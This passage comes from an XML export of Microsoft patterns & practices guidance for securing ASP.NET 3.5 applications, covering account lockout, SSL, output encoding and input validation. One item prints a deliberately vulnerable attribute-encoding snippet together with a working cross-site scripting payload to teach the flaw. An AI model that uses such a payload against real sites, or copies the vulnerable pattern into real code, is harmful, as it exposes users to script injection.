&lt;p&gt;Be careful that account lockout policies cannot be abused in denial of service attacks. For example, well known default service accounts such as IUSR_MACHINENAME should be replaced by custom account names to prevent an attacker who obtains the Internet Information
 Services (IIS) Web server name from locking out this critical account.&lt;/p&gt;
&lt;h2&gt;Be Able to Disable Accounts&lt;/h2&gt;
&lt;p&gt;If the system is compromised, being able to deliberately invalidate credentials or disable accounts can prevent additional attacks.&lt;/p&gt;
&lt;p&gt;The use of strong passwords, restricted login attempts, and other best practice account management policies can be enforced by Windows security policy if your application uses Windows authentication. Otherwise, the application layer is responsible for this.
 Review the following aspects of the account management of your application: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Does your application enforce strong passwords?&lt;/strong&gt;
&lt;p&gt;For example, do your ASP.NET Web pages use regular expressions to verify password complexity rules?
&lt;/p&gt;
&lt;blockquote&gt;&lt;strong&gt;Note&lt;/strong&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;If you are using the Membership feature of ASP.NET 2.0, you can configure the providers to enforce strong passwords. For more information, see &amp;quot;&lt;a href="http://msdn.microsoft.com/library/en-us/dnpag2/html/paght000012.asp"&gt;How
 To: Protect Forms Authentication in ASP.NET 2.0&lt;/a&gt;&amp;quot;.&lt;/blockquote&gt;
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Do you restrict the number of failed login attempts?&lt;/strong&gt;
&lt;p&gt;Doing so can help counter the threat of dictionary attacks. &lt;/p&gt;
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Do you reveal too much information in the event of failure?&lt;/strong&gt;
&lt;p&gt;Make sure you do not display messages such as &amp;quot;Incorrect password&amp;quot; because this tells malicious users that the user name is correct. This allows them to focus their efforts on cracking passwords.
&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Do you enforce a periodic change of passwords?&lt;/strong&gt;
&lt;p&gt;This is recommended because otherwise there is a high probability that a user will not change his or her password, which makes it more vulnerable.
&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Can you quickly disable accounts in the event of compromise?&lt;/strong&gt;
&lt;p&gt;If an account is compromised, can you easily disable the account to prevent the attacker from continuing to use the account?
&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Does your application record login attempts?&lt;/strong&gt;
&lt;p&gt;Recording failed login attempts is an effective way to detect an attacker who is attempting to break in.
&lt;/p&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Design Guidelines for Secure Web Applications &lt;a href="http://msdn2.microsoft.com/en-us/library/aa302420.aspx"&gt;
http://msdn2.microsoft.com/en-us/library/aa302420.aspx&lt;/a&gt; &lt;/li&gt;&lt;li&gt;Architecture and Design Review for Security &lt;a href="http://msdn2.microsoft.com/en-us/library/aa302420.aspx"&gt;
http://msdn2.microsoft.com/en-us/library/aa302420.aspx&lt;/a&gt; &lt;/li&gt;&lt;li&gt;Securing Your ASP.NET Application and Web Services &lt;a href="http://msdn2.microsoft.com/en-us/library/aa302435.aspx"&gt;
http://msdn2.microsoft.com/en-us/library/aa302435.aspx&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>c44d95ec-185a-4d3f-812b-4d3da3eb82a4</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Use SSL Between the Web Browser and Web Server When Pages Need to be Encrypted</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Communication Security</category>
    <phase>Implementation</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Use SSL as an encrypted communication channel to protect data sent between servers and web browsers. SSL can be used to help protect communication by encrypting traffic such as account information, billing data, etc.&amp;nbsp;&amp;nbsp;
&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;If sensitive data is sent between client and server unprotected it may be stolen or modified.&amp;nbsp; SSL can be used to help protect communication between client and server by encrypting network traffic.&amp;nbsp; Encryption will protect against eavesdropping (theft) but
 an attacker may still blindly modify the data for malicious purposes.&amp;nbsp; Use integrity checking (HMAC) to ensure the data has not been modified.&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;Use&amp;nbsp;SSL for communication between web browser and web server, when page content&amp;nbsp;needs to be encrypted on the network and the&amp;nbsp;identity&amp;nbsp;of the server needs to be guaranteed.
&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: SSL does carry a significant performance penalty in terms of latency that is introduced due to encryption/decryption of pages, so it is important to optimize the number of pages that use SSL. Please see &amp;quot;Guideline: Performance:Use
 SSL Only for Pages That Require It&amp;quot; for more information.&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;Use SSL to create a secure encrypted communication channel between browser clients and Web server.&lt;/p&gt;
&lt;p&gt;To use SSL:&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;nbsp; 1. Install a server certificate on the Web server.&lt;br&gt;
&amp;nbsp;&amp;nbsp; 2. Install the root certificate authority (CA) certificate from the same authority into the local computer's Trusted Root Certification Authorities certificate store.&lt;br&gt;
&amp;nbsp;&amp;nbsp; 3. Use IIS to configure the server to force the use of encryption while accessing Web pages.&lt;br&gt;
&amp;nbsp;&amp;nbsp; 4. Design pages with SSL in mind to minimize performance overhead. Optimize pages that use SSL by including less text and simple graphics and partition&amp;nbsp;the site and ensure that only those pages than contain sensitive data use SSL.&amp;nbsp;&lt;/p&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;An ASP.NET application allows users to login and maintain their contacts in an online database that is accesible via a web browser. The login&amp;nbsp;credentials are sent in plain text, which allows someone on the network to modify&amp;nbsp;the&amp;nbsp;data sent between&amp;nbsp;a browser
 and a server or view the contents. The lack of integrity and privacy means that the identity of the user and the identity of the web&amp;nbsp;entity serving out the pages can not be verified.&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/p&gt;
&lt;h1&gt;Solution Example&lt;/h1&gt;
&lt;p&gt;An ASP.NET application allows users to login and maintain their contacts in an online database that is accesible via a web browser. When the application is deployed, an SSL certificate is installed on the Web Server. The server is then setup to force users
 to use encryption while visiting pages containing sensitive information.&lt;/p&gt;
&lt;h1&gt;Additional Resources&amp;nbsp;&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;How To: Use SSL to Secure Communication with SQL Server&amp;nbsp;&lt;a href="http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dnnetsec/html/SecNetHT19.asp"&gt;http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dnnetsec/html/SecNetHT19.asp&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;Using Secure Sockets Layer &lt;a href="http://msdn2.microsoft.com/en-us/library/ds8bxk2a.aspx"&gt;
http://msdn2.microsoft.com/en-us/library/ds8bxk2a.aspx&lt;/a&gt; &lt;/li&gt;&lt;li&gt;Internet Protocol Version 6 &lt;a href="http://msdn2.microsoft.com/en-us/library/3x7ak53z(VS.80).aspx"&gt;
http://msdn2.microsoft.com/en-us/library/3x7ak53z(VS.80).aspx&lt;/a&gt; &lt;/li&gt;&lt;li&gt;How To: Use SSL between the browser and sdf &lt;a href="http://channel9.msdn.com/wiki/default.aspx/GuidanceLibrary.WebServerandBrowserSSLHowTo"&gt;
http://channel9.msdn.com/wiki/default.aspx/GuidanceLibrary.WebServerandBrowserSSLHowTo&lt;/a&gt;&amp;#43;
&lt;br&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:de1299b9-854b-4479-9f26-bbc9df38af29"&gt;Use SSL or IPSec for Secure Communication Between Entities&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:8afce3ed-b29f-4a25-ab8c-0d070383c7ad"&gt;Use SSL Between Untrusted Server Applications&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:b91cac26-e54a-4041-ad55-b8f55ac6a940"&gt;Optimize Pages that use SSL&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>c463b66b-1319-48c7-9f96-51f1254b4d93</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Use SSL When Transmitting Credentials</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Authentication</category>
    <phase>Implementation</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Use Secure Sockets Layer (SSL) to protect the authentication credentials passed between browser and server.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Using SSL prevents the credentials from being sniffed or tampered with as they are transmitted over the network. If SSL is not used, user credentials may be compromised by attacks such as a
&lt;a href="?#ruledisplay:B47A6486-A73E-44B9-AD17-1F7F94199828"&gt;Network Credential Sniffing Attack&lt;/a&gt; or a
&lt;a href="?#ruledisplay:9E3FC30A-B55C-4AF6-8B77-A534C6F87197"&gt;Phishing Attack&lt;/a&gt;. Additionally, use the
&lt;a href="?#ruledisplay:BB960347-F2E9-4926-8B75-ECCEE36D3EE8"&gt;Protect Session Cookies&lt;/a&gt; guideline to minimize the risk of exposing your application's session cookies to an attacker.&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;If your application accepts form-based authentication credentials from users.&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;Using Secure Socket Layer (SSL) over HTTP requires the following steps:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Create a certificate request.&lt;/strong&gt; Using the IIS management console, generate an SSL certificate request. This request is then sent to a Certification Authority to be signed. Follow these steps to generate the certificate request.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Start the &lt;strong&gt;IIS management console&lt;/strong&gt;. To do this, click on &lt;strong&gt;
Control Panel&lt;/strong&gt; -&amp;gt; &lt;strong&gt;Administrative Tools&lt;/strong&gt; -&amp;gt; &lt;strong&gt;Internet Information Services&lt;/strong&gt;.
&lt;/li&gt;&lt;li&gt;Right click on your application's virtual host and select &lt;strong&gt;Properties&lt;/strong&gt;.
&lt;/li&gt;&lt;li&gt;Click on &lt;strong&gt;Server Certificate&lt;/strong&gt; under the &lt;strong&gt;Directory Security&lt;/strong&gt; tab.
&lt;/li&gt;&lt;li&gt;Select &lt;strong&gt;Create a new certificate&lt;/strong&gt; and click &lt;strong&gt;Next&lt;/strong&gt;.
&lt;/li&gt;&lt;li&gt;Select &lt;strong&gt;Prepare the request now, but send it later&lt;/strong&gt; and click &lt;strong&gt;
Next&lt;/strong&gt;. &lt;/li&gt;&lt;li&gt;Provide &lt;strong&gt;your application's FQDN&lt;/strong&gt; and the desired bit length for your SSL certificate's encryption key, and then click
&lt;strong&gt;Next&lt;/strong&gt;. &lt;/li&gt;&lt;li&gt;Provide &lt;strong&gt;your organization's details&lt;/strong&gt; and click &lt;strong&gt;Next&lt;/strong&gt;.
&lt;/li&gt;&lt;li&gt;Provide &lt;strong&gt;your application's FQDN&lt;/strong&gt; and click &lt;strong&gt;Next&lt;/strong&gt;.
&lt;/li&gt;&lt;li&gt;Provide &lt;strong&gt;your organization's location details&lt;/strong&gt; and click &lt;strong&gt;
Next&lt;/strong&gt;. &lt;/li&gt;&lt;li&gt;Specify the location where you would like the IIS management console to store your application's certificate request.
&lt;/li&gt;&lt;li&gt;Click &lt;strong&gt;Finish&lt;/strong&gt; to complete the process.&lt;/li&gt;&lt;/ol&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Present the request to a Certification Authority (CA).&lt;/strong&gt; If all conditions for obtaining an SSL certificate are met, the CA will produce a new SSL certificate based on the certificate request. Because the requirements for obtaining an SSL
 certificate depend on the Certification Authority, consult with the Certification Authority in regards to the administrative steps necessary for obtaining such certificate.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Install the certificate.&lt;/strong&gt; Follow these steps to properly install your application's SSL certificate.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Start the &lt;strong&gt;IIS management console&lt;/strong&gt;. To do this, click on &lt;strong&gt;
Control Panel&lt;/strong&gt; -&amp;gt; &lt;strong&gt;Administrative Tools&lt;/strong&gt; -&amp;gt; &lt;strong&gt;Internet Information Services&lt;/strong&gt;.
&lt;/li&gt;&lt;li&gt;Right click on your application's virtual host and select &lt;strong&gt;Properties&lt;/strong&gt;.
&lt;/li&gt;&lt;li&gt;Click on &lt;strong&gt;Server Certificate&lt;/strong&gt; under the &lt;strong&gt;Directory Security&lt;/strong&gt; tab.
&lt;/li&gt;&lt;li&gt;Select &lt;strong&gt;Process the pending request and install the certificate&lt;/strong&gt; and click
&lt;strong&gt;Next&lt;/strong&gt;. &lt;/li&gt;&lt;li&gt;Specify the location of your application's SSL certificate and click &lt;strong&gt;
Next&lt;/strong&gt;. &lt;/li&gt;&lt;li&gt;Click &lt;strong&gt;Finish&lt;/strong&gt; to complete the process. &lt;/li&gt;&lt;/ol&gt;
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Ensure credentials are sent over SSL. &lt;/strong&gt;Place the authentication portion of your application on a dedicated subdomain. Configure the server to accept only HTTPS traffic for the authentication subdomain. Ensure that form posts containing credentials
 are sent over HTTPS. You can enforce your application's use SSL through several approaches:
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Server configuration.&lt;/strong&gt; Using the IIS management console, configure IIS to use SSL for all HTTP requests. Follow these steps to enable this option:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Start the IIS management console. To do this, click on Control Panel -&amp;gt; Administrative Tools -&amp;gt; Internet Information Services.
&lt;/li&gt;&lt;li&gt;Right click on your application's virtual host and select Properties. &lt;/li&gt;&lt;li&gt;Select the Directory Security tab. &lt;/li&gt;&lt;li&gt;Click Edit in the Secure Communications dialog. &lt;/li&gt;&lt;li&gt;Select Require Secure Channel (SSL) and click OK. &lt;/li&gt;&lt;li&gt;Click OK to apply the changes and close the property window. &lt;/li&gt;&lt;li&gt;Browse to http://&amp;lt;your application's FQDN&amp;gt;//. Verify that you receive the following error message:
&lt;pre&gt;HTTP 403.4 - Forbidden: SSL required.&lt;/pre&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Programatically.&lt;/strong&gt; Use the following considerations to improve your application's use of SSL:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;absolute URLs&lt;/strong&gt;: Use absolute URL paths when making form requests. Example:&lt;/p&gt;
&lt;pre&gt;&amp;lt;form method=&amp;quot;POST&amp;quot; action=&amp;quot;https://login.example.com/myapp/login.aspx&amp;quot;&amp;gt;&lt;/pre&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;requireSSL attribute&lt;/strong&gt;: In your application's &lt;strong&gt;web.config&lt;/strong&gt;, set the secure property by using
&lt;strong&gt;requireSSL=&amp;quot;true&amp;quot;&lt;/strong&gt; on the &lt;strong&gt;&amp;lt;forms&amp;gt;&lt;/strong&gt; element as follows:&lt;/p&gt;
&lt;pre&gt;&amp;lt;authentication mode=&amp;quot;Forms&amp;quot;&amp;gt;&lt;br&gt;   &amp;lt;forms loginUrl=&lt;a href="https://login.example.com/myapp/login.aspx"&gt;https://login.example.com/myapp/login.aspx&lt;/a&gt;&lt;br&gt;           requireSSL=&amp;quot;true&amp;quot;&lt;br&gt;           ...&lt;br&gt;   /&amp;gt;&lt;br&gt;&amp;lt;/authentication&amp;gt;&lt;/pre&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;The following snippet is part of an application's web.config. The application uses form based authentication and has configured its &amp;lt;forms&amp;gt; element accordingly. Unfortunately, the &amp;lt;forms&amp;gt; element does not have the requireSSL attribute set to true. Therefore
 the application fails to enforce the use of SSL when performing form-based authentication.&lt;/p&gt;
&lt;pre&gt;&amp;lt;!-- The forms element does not have a requireSSL attribute --&amp;gt;&lt;br&gt;&amp;lt;forms loginUrl=&amp;quot;Secure/Login.aspx&amp;quot;&lt;br&gt;       protection=&amp;quot;All&amp;quot;&lt;br&gt;       timeout=&amp;quot;00:30:00&amp;quot; &lt;br&gt;       slidingExpiration=&amp;quot;true&amp;quot;&lt;br&gt;       name=&amp;quot;MyApp&amp;quot;&lt;br&gt;       path=&amp;quot;/Secure&amp;quot;&lt;br&gt; /&amp;gt;&lt;/pre&gt;
&lt;h1&gt;Solution Example&lt;/h1&gt;
&lt;p&gt;The following snippet is part of an application's web.config. The application uses form based authentication and has configured its &amp;lt;forms&amp;gt; element accordingly. Because the &amp;lt;forms&amp;gt; element has the requireSSL attribute set to true, all form-based authentication
 will be performed over an HTTPS connection.&lt;/p&gt;
&lt;pre&gt;&amp;lt;!-- The forms element has the requireSSL attribute set to true --&amp;gt;&lt;br&gt;&amp;lt;forms loginUrl=&amp;quot;Secure/Login.aspx&amp;quot;&lt;br&gt;       protection=&amp;quot;All&amp;quot;&lt;br&gt;       &lt;strong&gt;requireSSL=&amp;quot;true&amp;quot;&lt;br&gt;&lt;/strong&gt;       timeout=&amp;quot;00:30:00&amp;quot;&lt;br&gt;       slidingExpiration=&amp;quot;true&amp;quot;&lt;br&gt;       name=&amp;quot;MyApp&amp;quot;&lt;br&gt;       path=&amp;quot;/Secure&amp;quot;&lt;br&gt; /&amp;gt;&lt;/pre&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;For more information on using SSL with IIS, visit: &lt;a href="http://support.microsoft.com/kb/299875"&gt;
How to implement SSL in IIS&lt;/a&gt;.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:FCB0A4AC-A559-430D-9145-08340EC73FED"&gt;Guideline: Protect Sensitive Data Over the Network
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:BB960347-F2E9-4926-8B75-ECCEE36D3EE8"&gt;Guideline: Protect Session Cookies
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:B47A6486-A73E-44B9-AD17-1F7F94199828"&gt;Attack: Network Credential Sniffing Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:9E3FC30A-B55C-4AF6-8B77-A534C6F87197"&gt;Attack: Phishing Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:4572037A-2166-4AD1-8E73-D623E468A7B9"&gt;Attack: Information Disclosure Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:B446B34C-8DEC-4F74-A392-C30D1719D90D"&gt;Attack: Trust Relationship Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:48BB4D3A-9295-4263-B3E7-090E483DEC5D"&gt;Attack: Man in the Middle Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:5CDA1EF2-79F3-4167-8E8F-E47E4B0A607A"&gt;Checklist Item: SSL is Used when Transmitting Credentials
&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>c6b2d31d-be63-46d7-ad00-f4ade5a0be4b</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Do Not Echo Untrusted Data Back to the User</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Input and Data Validation</category>
    <phase>Implementation</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Do not echo input back to the user without first validating and/or encoding the data.&amp;nbsp; Data which can be modified by a user must be treated as untrusted data, regardless of whether or not the user is expected to modify it during normal application use.
&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Echoing input directly back to the user makes your application susceptible to malicious input attacks, such as cross-site scripting.&amp;nbsp; If a malicious user can trick someone else into submitting dangerous input in such a way that it will be returned to the
 victim, or cause the site to store the malicious input they give it so it will be returned to other users, they can exploit vulnerabilities of this class.&amp;nbsp; What constitutes bad input varies widely depending on the system in question.&amp;nbsp; On the web, it normally
 means some kind of javascript. &lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;Applications should never echo untrusted or user modifiable data back to the user without appropriate encoding.
&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;If you write output that includes user input or data from a shared database or a local file that you do not trust, encode it.&amp;nbsp; Echoing input directly back to the user makes your application vulnerable to cross-site scripting attacks, among other problems.&amp;nbsp;
 Encoding the data ensures that it is treated as literal text and not as script.&amp;nbsp; ASP.NET's Server.HtmlEncode function is often used to protect against cross-site scripting attacks. However, this function only encodes &amp;lt;&amp;gt;&amp;quot;&amp;amp; characters. This is not sufficient
 to protect against all possible attacks. For instance, the following ASP.NET code would be vulnerable.
&lt;/p&gt;
&lt;pre&gt;&amp;lt;img id='img&amp;lt;%=Server.HtmlEncode(Request.QueryString[&amp;quot;userId&amp;quot;]) %&amp;gt;'&amp;nbsp;&amp;nbsp; src='/image.gif' /&amp;gt;&lt;/pre&gt;
&lt;p&gt;An attacker could inject client-side script here by setting &lt;strong&gt;userId &lt;/strong&gt;
to &lt;/p&gt;
&lt;pre&gt;' onload=alert('xss') alt='&lt;/pre&gt;
&lt;p&gt;The safest solution is to encode all non-alphanumeric characters. Only this type of whitelist solution will catch all possible XSS attacks, regardless of context.&amp;nbsp; This&amp;nbsp;requires more overhead in terms of processing time and size of the resulting HTML, but
 it is the safest encoding mechanism for all HTML contexts:&lt;/p&gt;
&lt;pre&gt;public static string HtmlEncode(string x)&lt;br&gt;{&lt;br&gt;   if (x == null)&lt;br&gt;   {&lt;br&gt;   &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;return x;&lt;br&gt;   }&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;return Regex.Replace(x, &amp;quot;[^a-zA-Z0-9]&amp;#43;&amp;quot;, new MatchEvaluator(WebUtility.EncodeMatch));&lt;br&gt;}&lt;/pre&gt;
&lt;p&gt;This is also the approach that the &lt;a href="http://www.microsoft.com/downloads/details.aspx?familyid=9a2b9c92-7ad9-496c-9a89-af08de2e5982&amp;amp;displaylang=en"&gt;
Microsoft Anti-Cross Site Scripting Library&lt;/a&gt;&amp;nbsp;takes.&amp;nbsp; If you are using the Anti-Cross Site Scripting Library, you can use the
&lt;strong&gt;Microsoft.Security.ApplicationAntiXSSLibrary.HtmlEncode&lt;/strong&gt; method.&amp;nbsp; Similarly, if you write URLs that might contain unsafe characters because they have been constructed from input data or data from a shared database, use
&lt;strong&gt;Microsoft.Security.ApplicationAntiXSSLibrary.UrlEncode&lt;/strong&gt; to make them safe.&amp;nbsp;
&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt; &amp;nbsp; &amp;nbsp; Make sure that you encode data at the last possible opportunity before the data is returned to the client.&amp;nbsp; If you encode any earlier than this, you may not know the exact context that the data will be used in, and hence the format
 you need to encode into.&amp;nbsp; Also, early encoding of some data can result in double encoding problems.
&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>cd4cadd9-3c87-410c-a504-68b71ba8b11b</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Validate Input from All Sources</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Input and Data Validation</category>
    <phase>Design</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>1</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Treat input from all external sources as untrusted and apply input validation techniques.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Input that is not validated can lead to cross-site scripting, SQL injection, directory traversals, and other vulnerabilities that would allow an attacker to gain unauthorized access to sensitive data or otherwise compromise an application.&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;Treat all input as untrusted. If you have established trust boundaries for your application, validate data every time it crosses a trust boundary.&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;An application can take input via various ways: file system, other software running on the server, etc. Use the following steps to establish a validation strategy:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify all sources of input:&lt;/strong&gt; Establish your application's trust boundary. The general notion is that all input not generated by your application is untrusted. Enumerate all possible sources of input and make note of the expected input
 from these sources. An application can have various sources of input. Each of these sources is an entry point to your application and can potentially be used to break your application's security model. Place a content specific validator at each entry point.&lt;/p&gt;
&lt;p&gt;Potential sources of input in a web application typically include:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;URL based parameters &lt;/li&gt;&lt;li&gt;Form based parameters &lt;/li&gt;&lt;li&gt;Hidden fields &lt;/li&gt;&lt;li&gt;Cookies &lt;/li&gt;&lt;li&gt;HTTP headers &lt;/li&gt;&lt;li&gt;Data stored on the local file system &lt;/li&gt;&lt;li&gt;Database &lt;/li&gt;&lt;li&gt;Other related services&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Understand the input that your application can handle and process:&lt;/strong&gt; Understand the specifics about your application's input. After identifying the different entry points, define the format and type of input that will be provided through each
 entry point. Build a validator for every format and type of expected input.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Create a set of validators:&lt;/strong&gt; Centralize your application's validators as it helps strengthen the code by limiting the amount of scattered validation code throughout your application. Place the set of validators on your application's trust
 boundary. Your application should accept input from the outside world only through its set of validators.&lt;/p&gt;
&lt;p&gt;See the &lt;a href="?#ruledisplay:D06E3B85-CCD8-41EC-8861-36D30BBAE909"&gt;Validate Input for Length, Range, Format, and Type&lt;/a&gt; guideline for more information on constructing validation routines.&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;In the following code, a page accepts a query string parameter called &lt;strong&gt;
isbn&lt;/strong&gt;. The value of this variable is used to look up a book in the database using an unmanaged middle-layer.&lt;/p&gt;
&lt;pre&gt;&amp;lt;script language=&amp;quot;C#&amp;quot; runat=&amp;quot;server&amp;quot;&amp;gt;&lt;br&gt;    protected void Page_Load(object sender, EventArgs e)&lt;br&gt;    {&lt;br&gt;        String strIsbn = this.Request.QueryString[&amp;quot;isbn&amp;quot;];&lt;br&gt;        //lookup isbn in a database using an&lt;br&gt;        //unamanged middle layer&lt;br&gt;    }&lt;br&gt;&amp;lt;/script&amp;gt;&lt;/pre&gt;
&lt;p&gt;In this example, the middle layer may be prone to malicious attacks as the value of ISBN is not validated. he length of the string is not limited, which could lead to a buffer overflow in the unmanaged middle layer, and it may not be in the correct format,
